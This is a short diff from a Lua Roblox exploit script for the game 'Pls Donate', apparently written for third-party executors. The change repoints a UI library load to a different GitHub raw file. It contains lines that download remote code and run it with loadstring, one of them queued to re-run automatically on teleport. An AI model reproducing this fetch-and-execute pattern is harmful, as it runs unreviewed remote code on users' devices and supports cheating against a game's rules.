@@ -43,7 +43,7 @@ local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or 
 local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
 local httpservice = game:GetService('HttpService')
 queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/C2BoT/Pls_donate/master/1.txt'))()")
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bardium/random/main/plsdonateoldui"))()
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/C2BoT/Pls_donate/master/2.txt"))()
 
 local function claimGifts()
 	pcall(function()
